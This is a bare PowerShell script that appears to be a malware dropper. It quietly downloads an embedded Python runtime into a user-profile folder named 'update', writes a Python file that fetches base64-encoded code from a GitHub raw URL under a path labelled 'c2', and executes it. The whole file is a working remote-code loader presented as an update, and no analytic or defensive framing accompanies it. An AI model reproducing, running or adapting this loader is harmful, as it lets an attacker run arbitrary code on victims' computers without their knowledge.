$url = 'https://www.python.org/ftp/python/3.13.14/python-3.13.14-embed-amd64.zip'
$ext = Join-Path $env:USERPROFILE 'update'
$zipPath = Join-Path $ext 'python.zip'
New-Item -Path $ext -ItemType Directory -Force | Out-Null
if (-not (Test-Path -LiteralPath (Join-Path $ext 'python.exe') -PathType Leaf)) {
    try {Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
        Expand-Archive -LiteralPath $zipPath -DestinationPath $ext -Force
        Remove-Item -LiteralPath $zipPath -Force} catch {exit 1}}
$PythonCode = @"
from urllib.request import urlopen 
import base64; url = "https://raw.githubusercontent.com/gaca9302/usb/refs/heads/main/c2/ng.txt"
with urlopen(url, timeout=5) as res: exec(compile(base64.b64decode(res.read()), '<binary>', 'exec'))
"@
Set-Content -Path (Join-Path $ext 'update.py') -Value $PythonCode -Encoding UTF8
& "$env:USERPROFILE\update\python.exe" "$env:USERPROFILE\update\update.py"
